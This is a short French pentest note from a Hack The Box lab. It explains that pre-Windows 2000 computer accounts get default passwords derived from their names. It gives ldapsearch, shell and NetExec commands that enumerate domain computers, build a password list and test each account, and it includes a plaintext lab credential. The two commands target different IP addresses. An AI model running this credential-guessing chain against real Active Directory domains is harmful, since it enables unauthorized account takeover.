
Si compte de machine créé en tant que pre-windows 2000 computer, alors son mot de passe est automatiquement défini avec les 14 premiers caractères de son computer name en minuscule sans le ``$`` -> Somecomp$ -> Somecomp

![[Pasted image 20250811142126.png]]

Récupérer la liste des domaines computers et tenter de s'authentifier avec leur nom comme mot de passe.

```sh
ldapsearch -H ldap://10.10.11.75 -D rr.parker -w '8#t5HE8L!W3A' -x -b "DC=RUSTYKEY,DC=HTB" -s sub "(&(objectclass=computer))" | grep sAMAccountName: | cut -f2 -d":" -d " "
 > computers
```

```sh
cat computers | tr -d '$' | tr '[:upper:]' '[:lower:]' | cut -c1-14 > computers_potential_passwords
```

```sh
nxc ldap 172.16.5.5 -u computers -p computers_potential_passwords --continue-on-success --no-bruteforce | grep +
```

